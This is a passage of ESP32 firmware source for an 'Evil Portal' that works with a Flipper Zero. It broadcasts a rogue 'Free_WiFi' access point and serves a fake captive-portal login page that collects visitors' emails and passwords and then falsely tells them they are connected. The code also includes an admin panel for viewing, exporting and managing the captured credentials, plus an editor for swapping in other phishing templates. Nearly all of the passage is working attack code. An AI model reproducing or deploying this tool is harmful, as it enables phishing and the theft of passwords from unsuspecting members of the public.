// ============================================================================
// ESP32-S3 Evil Portal - Flipper Zero Edition v1.3.0
// ============================================================================
// 
// Full-featured captive portal with Flipper Zero integration.
// NEW IN v1.3: Dynamic SSID/HTML changes from Web Admin (no restart needed)
//
// FEATURES:
//   - Flipper Zero communication (receives HTML/AP, sends credentials)
//   - SPIFFS credential storage (persists across reboots)
//   - Web admin panel with authentication
//   - REST API for integration
//   - JSON/CSV export
//   - Dynamic configuration
//   - Samsung auto-popup support (IP 4.3.2.1)
//   - Works standalone OR with Flipper
//   - [NEW] Dynamic SSID change without restart
//   - [NEW] HTML Template editor from web
//   - [NEW] Template management in SPIFFS
//   - [NEW] Bidirectional sync (Web ↔ Flipper)
//
// HARDWARE:
//   Board: ESP32-S3 (tested on Electronic Cats WiFi Dev Board)
//   
// FLIPPER CONNECTIONS:
//   ESP32 GPIO 43 (TX0) → Flipper Pin 14 (RX)
//   ESP32 GPIO 44 (RX0) → Flipper Pin 13 (TX)
//   ESP32 GND → Flipper GND
//
// ============================================================================

#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>

// ============================================================================
// VERSION INFO
// ============================================================================

#define FIRMWARE_VERSION "1.3.0-flipper"
#define MAX_CREDENTIALS 100
#define MAX_HTML_SIZE 20000
#define MAX_TEMPLATES 10

// ============================================================================
// SERIAL CONFIGURATION
// ============================================================================

#define FlipperSerial Serial0
#define DebugSerial Serial
#define FLIPPER_BAUD 115200

// ============================================================================
// DEFAULT CONFIGURATION
// ============================================================================

#define DEFAULT_SSID "Free_WiFi"
#define DEFAULT_ADMIN_USER "admin"
#define DEFAULT_ADMIN_PASS "admin"

// IP Configuration - 4.3.2.1 enables Samsung auto-popup
IPAddress apIP(4, 3, 2, 1);
IPAddress netMsk(255, 255, 255, 0);

// LED Pins (Electronic Cats WiFi Dev Board - active LOW)
#define LED_ACCENT_PIN 4   // Blue
#define LED_STATUS_PIN 5   // Green  
#define LED_ALERT_PIN  6   // Red

// ============================================================================
// GLOBAL VARIABLES
// ============================================================================

AsyncWebServer server(80);
DNSServer dnsServer;

// Configuration (loaded from SPIFFS)
String portalSSID = DEFAULT_SSID;
String adminUser = DEFAULT_ADMIN_USER;
String adminPass = DEFAULT_ADMIN_PASS;

// Active portal state (unified - can be changed from Web OR Flipper)
String activeSSID = DEFAULT_SSID;
char activeHtml[MAX_HTML_SIZE] = "";
bool hasCustomHtml = false;

// Runtime stats
unsigned long bootTime = 0;
int totalCaptures = 0;
int nextCredentialId = 1;
bool spiffsAvailable = false;

// Flipper mode tracking
bool flipperConnected = false;
bool flipperPortalRunning = false;
unsigned long lastFlipperActivity = 0;
#define FLIPPER_TIMEOUT 30000  // 30 seconds without activity = disconnected

// HTML buffer for multi-line reception
String htmlBuffer = "";
bool receivingHtml = false;
int htmlLineCount = 0;

// Source tracking for changes
enum ChangeSource { SOURCE_STANDALONE, SOURCE_WEB, SOURCE_FLIPPER };
ChangeSource lastChangeSource = SOURCE_STANDALONE;

// ============================================================================
// DEFAULT PORTAL HTML
// ============================================================================

const char portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Free WiFi</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; border-radius: 20px; padding: 40px; max-width: 400px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 60px; height: 60px; }
        h1 { text-align: center; color: #333; margin-bottom: 10px; font-size: 24px; }
        .subtitle { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        input { width: 100%; padding: 15px; border: 2px solid #e1e1e1; border-radius: 10px; font-size: 16px; transition: border-color 0.3s; }
        input:focus { outline: none; border-color: #667eea; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4); }
        .terms { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
        .success { display: none; text-align: center; }
        .success.show { display: block; }
        .success h2 { color: #10b981; margin-bottom: 10px; }
        .form-container.hide { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-container" id="formContainer">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="none" stroke="#667eea" stroke-width="2">
                    <path d="M5 12.55a11 11 0 0 1 14.08 0M1.42 9a16 16 0 0 1 21.16 0M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"/>
                </svg>
            </div>
            <h1>Free WiFi Access</h1>
            <p class="subtitle">Connect to continue browsing</p>
            <form id="loginForm">
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="email" placeholder="your@email.com" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter any password" required>
                </div>
                <button type="submit">Connect to WiFi</button>
            </form>
            <p class="terms">By connecting, you agree to our Terms of Service</p>
        </div>
        <div class="success" id="successMsg">
            <h2>✓ Connected!</h2>
            <p>You now have internet access.</p>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(this);
            var params = new URLSearchParams(formData).toString();
            var img = new Image();
            img.src = '/get?' + params;
            document.getElementById('formContainer').classList.add('hide');
            document.getElementById('successMsg').classList.add('show');
        });
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
// ADMIN PANEL HTML - DASHBOARD
// ============================================================================

const char admin_dashboard_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Evil Portal - Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; }
        .navbar { background: #1e293b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
        .navbar h1 { font-size: 18px; color: #f8fafc; }
        .navbar h1 span { color: #ef4444; }
        .nav-links { display: flex; gap: 15px; }
        .nav-links a { color: #94a3b8; text-decoration: none; font-size: 14px; padding: 8px 12px; border-radius: 6px; transition: all 0.2s; }
        .nav-links a:hover, .nav-links a.active { background: #334155; color: #f8fafc; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #1e293b; border-radius: 12px; padding: 20px; border: 1px solid #334155; }
        .stat-card h3 { color: #94a3b8; font-size: 14px; margin-bottom: 10px; }
        .stat-card .value { font-size: 32px; font-weight: 700; color: #f8fafc; }
        .stat-card .value.success { color: #10b981; }
        .stat-card .value.warning { color: #f59e0b; }
        .stat-card .value.info { color: #3b82f6; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; }
        .card-header { padding: 15px 20px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }
        .card-header h2 { font-size: 16px; color: #f8fafc; }
        .card-body { padding: 20px; }
        .badge { padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 500; }
        .badge-success { background: #064e3b; color: #10b981; }
        .badge-warning { background: #78350f; color: #fbbf24; }
        .badge-info { background: #1e3a5f; color: #3b82f6; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #334155; }
        th { color: #94a3b8; font-weight: 500; font-size: 13px; }
        td { color: #e2e8f0; font-size: 14px; }
        .mode-indicator { display: flex; align-items: center; gap: 8px; }
        .mode-dot { width: 10px; height: 10px; border-radius: 50%; }
        .mode-dot.standalone { background: #10b981; }
        .mode-dot.flipper { background: #f59e0b; }
        .version { color: #64748b; font-size: 12px; margin-top: 20px; text-align: center; }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 <span>Evil</span>Portal Studio</h1>
        <div class="nav-links">
            <a href="/admin" class="active">Dashboard</a>
            <a href="/admin/logs">Logs</a>
            <a href="/admin/config">Config</a>
            <a href="/admin/templates">Templates</a>
            <a href="/admin/export">Export</a>
            <a href="/admin/logout">Logout</a>
        </div>
    </nav>
    <div class="container">
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Credentials Captured</h3>
                <div class="value success" id="credCount">-</div>
            </div>
            <div class="stat-card">
                <h3>Active SSID</h3>
                <div class="value info" id="ssidValue" style="font-size:18px;">-</div>
            </div>
            <div class="stat-card">
                <h3>Uptime</h3>
                <div class="value" id="uptime">-</div>
            </div>
            <div class="stat-card">
                <h3>Mode</h3>
                <div class="mode-indicator">
                    <span class="mode-dot" id="modeDot"></span>
                    <span id="modeText">-</span>
                </div>
            </div>
        </div>
        <div class="card">
            <div class="card-header">
                <h2>Recent Captures</h2>
                <a href="/admin/logs" style="color:#3b82f6;text-decoration:none;font-size:14px;">View All →</a>
            </div>
            <div class="card-body">
                <table>
                    <thead><tr><th>Email/Username</th><th>Password</th><th>IP</th><th>Time</th></tr></thead>
                    <tbody id="recentLogs"></tbody>
                </table>
            </div>
        </div>
        <div class="card">
            <div class="card-header">
                <h2>System Info</h2>
            </div>
            <div class="card-body">
                <table>
                    <tr><td>Firmware Version</td><td id="fwVersion">-</td></tr>
                    <tr><td>IP Address</td><td id="ipAddr">-</td></tr>
                    <tr><td>Free Memory</td><td id="freeMemory">-</td></tr>
                    <tr><td>SPIFFS Status</td><td id="spiffsStatus">-</td></tr>
                    <tr><td>Flipper Connected</td><td id="flipperStatus">-</td></tr>
                    <tr><td>HTML Source</td><td id="htmlSource">-</td></tr>
                </table>
            </div>
        </div>
        <p class="version">Evil Portal Studio v1.3.0</p>
    </div>
    <script>
        function formatUptime(seconds) {
            var h = Math.floor(seconds / 3600);
            var m = Math.floor((seconds % 3600) / 60);
            var s = seconds % 60;
            return h + 'h ' + m + 'm ' + s + 's';
        }
        function loadDashboard() {
            fetch('/api/v1/dashboard').then(r => r.json()).then(data => {
                document.getElementById('credCount').textContent = data.credentials_count;
                document.getElementById('ssidValue').textContent = data.ssid;
                document.getElementById('uptime').textContent = formatUptime(data.uptime);
                document.getElementById('fwVersion').textContent = data.version;
                document.getElementById('ipAddr').textContent = data.ip;
                document.getElementById('freeMemory').textContent = Math.round(data.memory_free / 1024) + ' KB';
                document.getElementById('spiffsStatus').innerHTML = data.spiffs_available ? '<span class="badge badge-success">Available</span>' : '<span class="badge badge-warning">Unavailable</span>';
                document.getElementById('flipperStatus').innerHTML = data.flipper_connected ? '<span class="badge badge-success">Connected</span>' : '<span class="badge badge-info">Not Connected</span>';
                document.getElementById('htmlSource').textContent = data.html_source || 'Default';
                var dot = document.getElementById('modeDot');
                var text = document.getElementById('modeText');
                if (data.flipper_connected) {
                    dot.className = 'mode-dot flipper';
                    text.textContent = 'Flipper Mode';
                } else {
                    dot.className = 'mode-dot standalone';
                    text.textContent = 'Standalone';
                }
            });
            fetch('/api/v1/logs?limit=5').then(r => r.json()).then(data => {
                var tbody = document.getElementById('recentLogs');
                tbody.innerHTML = '';
                if (data.credentials && data.credentials.length > 0) {
                    data.credentials.forEach(function(c) {
                        tbody.innerHTML += '<tr><td>' + (c.email || c.username || '-') + '</td><td>' + (c.password || '-') + '</td><td>' + (c.ip || '-') + '</td><td>' + (c.timestamp || '-') + '</td></tr>';
                    });
                } else {
                    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#64748b;">No captures yet</td></tr>';
                }
            });
        }
        loadDashboard();
        setInterval(loadDashboard, 5000);
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
// ADMIN PANEL HTML - LOGS
// ============================================================================

const char admin_logs_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Evil Portal - Logs</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; }
        .navbar { background: #1e293b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
        .navbar h1 { font-size: 18px; color: #f8fafc; }
        .navbar h1 span { color: #ef4444; }
        .nav-links { display: flex; gap: 15px; }
        .nav-links a { color: #94a3b8; text-decoration: none; font-size: 14px; padding: 8px 12px; border-radius: 6px; transition: all 0.2s; }
        .nav-links a:hover, .nav-links a.active { background: #334155; color: #f8fafc; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; }
        .card-header { padding: 15px 20px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }
        .card-header h2 { font-size: 16px; color: #f8fafc; }
        .card-body { padding: 20px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; min-width: 600px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #334155; }
        th { color: #94a3b8; font-weight: 500; font-size: 13px; }
        td { color: #e2e8f0; font-size: 14px; }
        .btn { padding: 8px 16px; border-radius: 6px; font-size: 14px; cursor: pointer; border: none; transition: all 0.2s; }
        .btn-danger { background: #dc2626; color: white; }
        .btn-danger:hover { background: #b91c1c; }
        .btn-sm { padding: 4px 10px; font-size: 12px; }
        .badge { padding: 4px 10px; border-radius: 20px; font-size: 12px; }
        .badge-flipper { background: #78350f; color: #fbbf24; }
        .badge-standalone { background: #064e3b; color: #10b981; }
        .empty-state { text-align: center; padding: 40px; color: #64748b; }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 <span>Evil</span>Portal Studio</h1>
        <div class="nav-links">
            <a href="/admin">Dashboard</a>
            <a href="/admin/logs" class="active">Logs</a>
            <a href="/admin/config">Config</a>
            <a href="/admin/templates">Templates</a>
            <a href="/admin/export">Export</a>
            <a href="/admin/logout">Logout</a>
        </div>
    </nav>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <h2>Captured Credentials</h2>
                <button class="btn btn-danger" onclick="clearAll()">Clear All</button>
            </div>
            <div class="card-body">
                <table>
                    <thead><tr><th>ID</th><th>Email/Username</th><th>Password</th><th>IP Address</th><th>Source</th><th>Timestamp</th><th>Actions</th></tr></thead>
                    <tbody id="logsTable"></tbody>
                </table>
            </div>
        </div>
    </div>
    <script>
        function loadLogs() {
            fetch('/api/v1/logs').then(r => r.json()).then(data => {
                var tbody = document.getElementById('logsTable');
                tbody.innerHTML = '';
                if (data.credentials && data.credentials.length > 0) {
                    data.credentials.forEach(function(c) {
                        var sourceClass = c.flipper_mode ? 'badge-flipper' : 'badge-standalone';
                        var sourceText = c.flipper_mode ? 'Flipper' : 'Standalone';
                        tbody.innerHTML += '<tr><td>' + c.id + '</td><td>' + (c.email || '-') + '</td><td>' + (c.password || '-') + '</td><td>' + (c.ip || '-') + '</td><td><span class="badge ' + sourceClass + '">' + sourceText + '</span></td><td>' + (c.timestamp || '-') + '</td><td><button class="btn btn-danger btn-sm" onclick="deleteLog(' + c.id + ')">Delete</button></td></tr>';
                    });
                } else {
                    tbody.innerHTML = '<tr><td colspan="7" class="empty-state">No credentials captured yet</td></tr>';
                }
            });
        }
        function deleteLog(id) {
            if (confirm('Delete this credential?')) {
                fetch('/api/v1/logs/' + id, { method: 'DELETE' }).then(() => loadLogs());
            }
        }
        function clearAll() {
            if (confirm('Delete ALL credentials? This cannot be undone.')) {
                fetch('/api/v1/logs', { method: 'DELETE' }).then(() => loadLogs());
            }
        }
        loadLogs();
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
// ADMIN PANEL HTML - CONFIG (Updated for v1.3)
// ============================================================================

const char admin_config_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Evil Portal - Config</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; }
        .navbar { background: #1e293b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
        .navbar h1 { font-size: 18px; color: #f8fafc; }
        .navbar h1 span { color: #ef4444; }
        .nav-links { display: flex; gap: 15px; }
        .nav-links a { color: #94a3b8; text-decoration: none; font-size: 14px; padding: 8px 12px; border-radius: 6px; transition: all 0.2s; }
        .nav-links a:hover, .nav-links a.active { background: #334155; color: #f8fafc; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; }
        .card-header { padding: 15px 20px; border-bottom: 1px solid #334155; }
        .card-header h2 { font-size: 16px; color: #f8fafc; }
        .card-body { padding: 20px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #94a3b8; font-size: 14px; }
        input, select { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #e2e8f0; font-size: 14px; }
        input:focus, select:focus { outline: none; border-color: #3b82f6; }
        .btn { padding: 12px 20px; border-radius: 8px; font-size: 14px; cursor: pointer; border: none; transition: all 0.2s; width: 100%; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-primary:hover { background: #2563eb; }
        .btn-success { background: #10b981; color: white; }
        .btn-success:hover { background: #059669; }
        .btn-danger { background: #dc2626; color: white; }
        .btn-danger:hover { background: #b91c1c; }
        .help-text { font-size: 12px; color: #64748b; margin-top: 5px; }
        .success-msg { background: #064e3b; color: #10b981; padding: 12px; border-radius: 8px; margin-bottom: 20px; display: none; text-align: center; }
        .success-msg.show { display: block; }
        .warning-box { background: #78350f; border: 1px solid #92400e; border-radius: 8px; padding: 15px; margin-bottom: 20px; }
        .warning-box h4 { color: #fbbf24; margin-bottom: 5px; }
        .warning-box p { color: #fcd34d; font-size: 13px; }
        .live-badge { display: inline-block; background: #10b981; color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; margin-left: 10px; }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 <span>Evil</span>Portal Studio</h1>
        <div class="nav-links">
            <a href="/admin">Dashboard</a>
            <a href="/admin/logs">Logs</a>
            <a href="/admin/config" class="active">Config</a>
            <a href="/admin/templates">Templates</a>
            <a href="/admin/export">Export</a>
            <a href="/admin/logout">Logout</a>
        </div>
    </nav>
    <div class="container">
        <div class="success-msg" id="successMsg">✓ Settings saved successfully!</div>
        
        <div id="flipperNote" class="warning-box" style="display:none;">
            <h4>⚠️ Flipper Mode Active</h4>
            <p>Flipper Zero is connected. Changes made here will override Flipper settings until Flipper sends new data.</p>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h2>Portal Settings <span class="live-badge">LIVE</span></h2>
            </div>
            <div class="card-body">
                <form id="ssidForm">
                    <div class="form-group">
                        <label>WiFi Network Name (SSID)</label>
                        <input type="text" name="ssid" id="ssid" maxlength="32" required>
                        <p class="help-text">Changes apply immediately - no restart needed! Max 32 characters.</p>
                    </div>
                    <button type="submit" class="btn btn-success">Apply SSID Now</button>
                </form>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h2>Admin Credentials</h2>
            </div>
            <div class="card-body">
                <form id="adminForm">
                    <div class="form-group">
                        <label>Admin Username</label>
                        <input type="text" name="admin_user" id="admin_user" required>
                    </div>
                    <div class="form-group">
                        <label>Admin Password</label>
                        <input type="password" name="admin_pass" id="admin_pass" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Update Credentials</button>
                </form>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h2>Device Control</h2>
            </div>
            <div class="card-body">
                <button onclick="rebootDevice()" class="btn btn-danger">Reboot Device</button>
                <p class="help-text" style="margin-top:10px;">Device will restart. You'll need to reconnect to the portal.</p>
            </div>
        </div>
    </div>
    <script>
        function loadConfig() {
            fetch('/api/v1/config').then(r => r.json()).then(data => {
                document.getElementById('ssid').value = data.active_ssid || data.ssid;
                document.getElementById('admin_user').value = data.admin_user;
                if (data.flipper_connected) {
                    document.getElementById('flipperNote').style.display = 'block';
                }
            });
        }
        function showSuccess(msg) {
            var el = document.getElementById('successMsg');
            el.textContent = '✓ ' + (msg || 'Settings saved successfully!');
            el.classList.add('show');
            setTimeout(() => el.classList.remove('show'), 3000);
        }
        document.getElementById('ssidForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/api/v1/ssid', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ssid: document.getElementById('ssid').value })
            }).then(r => r.json()).then(data => {
                if (data.success) {
                    showSuccess('SSID changed to "' + data.new_ssid + '" - Active now!');
                } else {
                    alert('Error: ' + (data.error || 'Unknown error'));
                }
            });
        });
        document.getElementById('adminForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch('/api/v1/config', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    admin_user: document.getElementById('admin_user').value,
                    admin_pass: document.getElementById('admin_pass').value
                })
            }).then(r => r.json()).then(data => {
                if (data.success) {
                    showSuccess('Credentials updated! Please login again.');
                    setTimeout(() => window.location.href = '/admin', 2000);
                }
            });
        });
        function rebootDevice() {
            if (confirm('Reboot the device?')) {
                fetch('/api/v1/reboot', { method: 'POST' }).then(() => {
                    alert('Device is rebooting...');
                });
            }
        }
        loadConfig();
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
// ADMIN PANEL HTML - TEMPLATES (NEW in v1.3)
// ============================================================================

const char admin_templates_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Evil Portal - Templates</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; }
        .navbar { background: #1e293b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
        .navbar h1 { font-size: 18px; color: #f8fafc; }
        .navbar h1 span { color: #ef4444; }
        .nav-links { display: flex; gap: 15px; }
        .nav-links a { color: #94a3b8; text-decoration: none; font-size: 14px; padding: 8px 12px; border-radius: 6px; transition: all 0.2s; }
        .nav-links a:hover, .nav-links a.active { background: #334155; color: #f8fafc; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; }
        .card-header { padding: 15px 20px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }
        .card-header h2 { font-size: 16px; color: #f8fafc; }
        .card-body { padding: 20px; }
        .template-list { list-style: none; }
        .template-item { padding: 12px 15px; border-bottom: 1px solid #334155; cursor: pointer; transition: background 0.2s; display: flex; justify-content: space-between; align-items: center; }
        .template-item:hover { background: #334155; }
        .template-item.active { background: #1e3a5f; border-left: 3px solid #3b82f6; }
        .template-item .name { font-weight: 500; }
        .template-item .size { font-size: 12px; color: #64748b; }
        .badge { padding: 2px 8px; border-radius: 10px; font-size: 11px; }
        .badge-active { background: #10b981; color: white; }
        .badge-default { background: #3b82f6; color: white; }
        textarea { width: 100%; height: 400px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #e2e8f0; font-family: 'Monaco', 'Menlo', monospace; font-size: 13px; padding: 15px; resize: vertical; }
        textarea:focus { outline: none; border-color: #3b82f6; }
        .btn { padding: 10px 20px; border-radius: 8px; font-size: 14px; cursor: pointer; border: none; transition: all 0.2s; margin-right: 10px; }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-success { background: #10b981; color: white; }
        .btn-danger { background: #dc2626; color: white; }
        .btn:hover { opacity: 0.9; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; color: #94a3b8; font-size: 14px; }
        input { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #e2e8f0; font-size: 14px; }
        .success-msg { background: #064e3b; color: #10b981; padding: 12px; border-radius: 8px; margin-bottom: 20px; display: none; text-align: center; }
        .success-msg.show { display: block; }
        .preview-frame { width: 100%; height: 300px; border: 1px solid #334155; border-radius: 8px; background: white; }
        .actions { margin-top: 15px; display: flex; gap: 10px; }
        .live-indicator { display: flex; align-items: center; gap: 8px; color: #10b981; font-size: 13px; }
        .live-dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 <span>Evil</span>Portal Studio</h1>
        <div class="nav-links">
            <a href="/admin">Dashboard</a>
            <a href="/admin/logs">Logs</a>
            <a href="/admin/config">Config</a>
            <a href="/admin/templates" class="active">Templates</a>
            <a href="/admin/export">Export</a>
            <a href="/admin/logout">Logout</a>
        </div>
    </nav>
    <div class="container">
        <div class="success-msg" id="successMsg">✓ Template applied successfully!</div>
        
        <div class="grid">
            <div>
                <div class="card">
                    <div class="card-header">
                        <h2>Saved Templates</h2>
                    </div>
                    <div class="card-body" style="padding:0;">
                        <ul class="template-list" id="templateList">
                            <li class="template-item" onclick="loadTemplate('default')">
                                <div>
                                    <div class="name">Default (Free WiFi)</div>
                                    <div class="size">Built-in</div>
                                </div>
                                <span class="badge badge-default">Default</span>
                            </li>
                        </ul>
                    </div>
                </div>
                
                <div class="card" style="margin-top:20px;">
                    <div class="card-header">
                        <h2>Save New Template</h2>
                    </div>
                    <div class="card-body">
                        <div class="form-group">
                            <label>Template Name</label>
                            <input type="text" id="newTemplateName" placeholder="e.g., hotel_wifi">
                        </div>
                        <button class="btn btn-primary" onclick="saveAsTemplate()">Save Current as Template</button>
                    </div>
                </div>
            </div>
            
            <div>
                <div class="card">
                    <div class="card-header">
                        <h2>HTML Editor</h2>
                        <div class="live-indicator">
                            <span class="live-dot"></span>
                            <span>Changes apply instantly</span>
                        </div>
                    </div>
                    <div class="card-body">
                        <textarea id="htmlEditor" placeholder="Paste your HTML template here..."></textarea>
                        <div class="actions">
                            <button class="btn btn-success" onclick="applyHtml()">Apply HTML Now</button>
                            <button class="btn btn-primary" onclick="previewHtml()">Preview</button>
                            <button class="btn btn-danger" onclick="resetToDefault()">Reset to Default</button>
                        </div>
                    </div>
                </div>
                
                <div class="card" style="margin-top:20px;">
                    <div class="card-header">
                        <h2>Preview</h2>
                    </div>
                    <div class="card-body">
                        <iframe id="previewFrame" class="preview-frame"></iframe>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        var currentHtml = '';
        
        function showSuccess(msg) {
            var el = document.getElementById('successMsg');
            el.textContent = '✓ ' + msg;
            el.classList.add('show');
            setTimeout(() => el.classList.remove('show'), 3000);
        }
        
        function loadTemplates() {
            fetch('/api/v1/templates').then(r => r.json()).then(data => {
                var list = document.getElementById('templateList');
                list.innerHTML = '<li class="template-item" onclick="loadTemplate(\'default\')"><div><div class="name">Default (Free WiFi)</div><div class="size">Built-in</div></div><span class="badge badge-default">Default</span></li>';
                if (data.templates) {
                    data.templates.forEach(function(t) {
                        var activeClass = t.active ? ' active' : '';
                        var badge = t.active ? '<span class="badge badge-active">Active</span>' : '';
                        list.innerHTML += '<li class="template-item' + activeClass + '" onclick="loadTemplate(\'' + t.name + '\')"><div><div class="name">' + t.name + '</div><div class="size">' + t.size + ' bytes</div></div>' + badge + '</li>';
                    });
                }
            });
        }
        
        function loadCurrentHtml() {
            fetch('/api/v1/portal-html').then(r => r.json()).then(data => {
                document.getElementById('htmlEditor').value = data.html || '';
                currentHtml = data.html || '';
                updatePreview(currentHtml);
            });
        }
        
        function loadTemplate(name) {
            if (name === 'default') {
                fetch('/api/v1/portal-html?default=true').then(r => r.json()).then(data => {
                    document.getElementById('htmlEditor').value = data.html || '';
                    updatePreview(data.html);
                });
            } else {
                fetch('/api/v1/templates/' + name).then(r => r.json()).then(data => {
                    document.getElementById('htmlEditor').value = data.html || '';
                    updatePreview(data.html);
                });
            }
        }
        
        function applyHtml() {
            var html = document.getElementById('htmlEditor').value;
            fetch('/api/v1/portal-html', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ html: html })
            }).then(r => r.json()).then(data => {
                if (data.success) {
                    showSuccess('HTML applied! Portal is now using this template.');
                    loadTemplates();
                } else {
                    alert('Error: ' + (data.error || 'Unknown error'));
                }
            });
        }
        
        function previewHtml() {
            var html = document.getElementById('htmlEditor').value;
            updatePreview(html);
        }
        
        function updatePreview(html) {
            var frame = document.getElementById('previewFrame');
            frame.srcdoc = html;
        }
        
        function resetToDefault() {
